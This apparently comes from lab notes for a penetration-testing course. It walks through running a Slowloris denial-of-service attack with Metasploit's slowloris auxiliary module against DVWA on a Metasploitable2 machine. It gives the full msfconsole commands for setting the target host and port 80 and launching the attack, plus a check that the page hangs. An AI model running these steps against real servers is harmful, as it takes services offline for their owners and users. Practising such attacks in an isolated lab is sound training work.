# Slowloris
- ## There are two ways of use it one install [slowloris](https://github.com/gkbrk/slowloris) and another we can use it from metasploit framework

## we will perform it on [metasploitable2](https://sourceforge.net/projects/metasploitable/) on http service (DVWA)

### 1.run metasploitable framework
- ```bash
    msfconsole
  ```
### 2.search for slowloris
- ```bash
    search slowloris
  ```
### 3.choose auxiliary/dos/http/slowloris
- ```bash
    use auxiliary/dos/http/slowloris
  ```
### 4.set rhost <your metasploitable machine ip or target ip>
- ```bash
    set RHOST <target ip>
  ```
### 5.set rport (we will down the http so we will choose port 80)
- ```bash
    set RPORT 80
  ```
### 6.check if everything is set correctly
- ```bash
    show options
  ```
### 7.exploit the attack 
- ```bash
    exploit
  ```
## How check the dvwa of m2 machine by write the ip in browser
- if it is continues loading then it's worked
